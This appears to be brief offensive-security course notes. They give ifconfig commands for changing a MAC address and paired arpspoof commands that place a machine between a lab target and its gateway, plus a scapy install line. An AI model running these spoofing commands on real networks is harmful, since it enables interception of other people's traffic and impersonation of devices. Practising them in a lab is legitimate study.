# Offensive Security Python
> From Zaid Sabih

Topics
- Changing MAC Address 
- ARP Spoofing

## Changing MAC ADDRESS
Commands
```
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
ifconfig wlan0 
```
## ARP SPOOF 
Terminal 1 for Target  
```
arpspoof -i <INTERFACE> -t <TARGET IP> <GATEWAY IP>
arpspoof -i eth0 -t 10.0.2.7 10.0.2.1
```

Terminal 2 for Gateway  
```
arpspoof -i <INTERFACE> -t <GATEWAY IP> <TARGET IP>
arpspoof -i eth0 -t 10.0.2.1 10.0.2.7 
```

--- 
### python3

pip3 install scapy-python3
